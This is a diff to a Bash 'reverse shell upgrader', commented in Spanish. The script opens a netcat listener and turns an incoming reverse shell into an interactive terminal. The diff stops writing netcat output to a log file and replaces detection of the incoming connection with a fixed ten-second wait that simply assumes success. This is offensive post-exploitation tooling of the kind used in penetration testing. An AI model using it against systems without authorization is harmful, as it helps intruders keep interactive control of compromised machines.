@@ -1,11 +1,11 @@
 #!/usr/bin/env bash
 
-# Ultimate Reverse Shell Upgrader (v3.0)
+# Ultimate Reverse Shell Upgrader (v2.0) - Modificado sin log
 # Features:
 # - Parámetros interactivos si no se especifican
 # - Orden IP primero, puerto después
 # - Validación de entrada robusta
-# - Todo lo anterior mejorado
+# - Eliminado el log a archivo
 
 set -eo pipefail
 IFS=$'\n\t'
@@ -178,6 +178,7 @@ fi
 echo -e "${GREEN}[*] Iniciando listener en ${LISTEN_IP}:${PORT}${NC}"
 echo -e "${YELLOW}[*] Usa Ctrl+C para salir${NC}"
 
+# Detectar argumentos correctos para netcat
 case $($NC_CMD -h 2>&1) in
     *"OpenBSD"*|*"Debian"*)
         NC_ARGS="-lvnp $PORT -s $LISTEN_IP" ;;
@@ -185,10 +186,11 @@ case $($NC_CMD -h 2>&1) in
         NC_ARGS="-l -v -n -p $PORT -s $LISTEN_IP" ;;
 esac
 
-$NC_CMD $NC_ARGS < /tmp/input > >(tee nc_output.log) 2>&1 &
+# Lanzar netcat sin redirigir salida a un log
+$NC_CMD $NC_ARGS < /tmp/input > /dev/null 2>&1 &
 NC_PID=$!
 
-# Timeout
+# Timeout para verificar que netcat siga en ejecución
 {
     sleep $TIMEOUT
     if ! ps -p $NC_PID > /dev/null; then
@@ -197,22 +199,11 @@ NC_PID=$!
     fi
 } &
 
-# Esperar conexión
-wait_for_connection() {
-    until grep -q "Connection received" nc_output.log || \
-          grep -q "Connection from" nc_output.log || \
-          grep -q "connect to" nc_output.log; do
-        sleep 0.5
-        if ! ps -p $NC_PID > /dev/null; then
-            echo -e "${RED}[!] Netcat terminó inesperadamente${NC}"
-            cleanup
-        fi
-    done
-}
+# Esperar conexión mediante tiempo fijo (sin leer log)
+echo -e "${YELLOW}[*] Esperando conexión (espera fija de 10 segundos)${NC}"
+sleep 10
 
-wait_for_connection
-
-echo -e "${GREEN}[+] Conexión establecida!${NC}"
+echo -e "${GREEN}[+] Asumiendo que la conexión fue establecida (o en espera activa)...${NC}"
 echo -e "${YELLOW}[*] Mejorando shell...${NC}"
 
 upgrade_shell
@@ -220,7 +211,7 @@ upgrade_shell
 echo -e "${GREEN}[+] Shell mejorada con éxito!${NC}"
 echo -e "${YELLOW}[*] Usa 'reset' si hay problemas de terminal al salir${NC}"
 
-# Mantener sesión interactiva
+# Intentar pasar la sesión al primer plano, si es aplicable
 if ! fg >/dev/null 2>&1; then
     echo -e "${RED}[!] Error al traer a primer plano${NC}"
     cleanup
